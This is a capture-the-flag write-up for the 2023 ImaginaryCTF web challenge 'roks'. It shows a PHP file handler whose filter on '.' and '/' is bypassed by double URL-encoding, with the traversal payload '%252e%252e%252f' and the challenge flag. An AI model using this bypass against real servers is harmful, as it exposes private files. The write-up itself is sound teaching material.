---
title: 2023 ImaginaryCTF - roks
author: thanguyen165
date: 2023-07-23 00:00:00 +0700
categories: [Write-ups, 2023_imaginaryCTF]
tags: [Web Exploitation, write-ups]
---

* Points: 100

## Description

> My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?

### Attached

[roks.zip](https://imaginaryctf.org/r/0Sm4V#roks.zip)

## Analyzation

Check the docker file first
```docker
FROM php:8-apache

RUN /usr/sbin/useradd -u 1000 user

COPY index.php /var/www/html/
COPY file.php /var/www/html/
COPY styles.css /var/www/html/
COPY stopHacking.png /var/www/html/

RUN mkdir /var/www/html/images
COPY images/* /var/www/html/images
COPY flag.png /

VOLUME /var/log/apache2
VOLUME /var/run/apache2

CMD bash -c 'source /etc/apache2/envvars && APACHE_RUN_USER=user APACHE_RUN_GROUP=user /usr/sbin/apache2 -D FOREGROUND'
```

So the flag is at root directory, and the site is at ```/var/www/html/```

Check the ```index.php```

```php
xhr.open("GET", "file.php?file=" + randomImageName, true);
```

then ```file.php```

```php
<?php
  $filename = urldecode($_GET["file"]);
  if (str_contains($filename, "/") or str_contains($filename, ".")) {
    $contentType = mime_content_type("stopHacking.png");
    header("Content-type: $contentType");
    readfile("stopHacking.png");
  } else {
    $filePath = "images/" . urldecode($filename);
    $contentType = mime_content_type($filePath);
    header("Content-type: $contentType");
    readfile($filePath);
  }
?>
```

So we must do directory traversal, but we cannot use dot "." or slash "/".

Also, ascii code, like

```
%2e%2e%2f
```

will not work due to
```php
$filename = urldecode($_GET["file"]);
```

## Solution

Encode one time fails, so do it twice

```
%252e%252e%252f
```

The flag is
```
ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}
```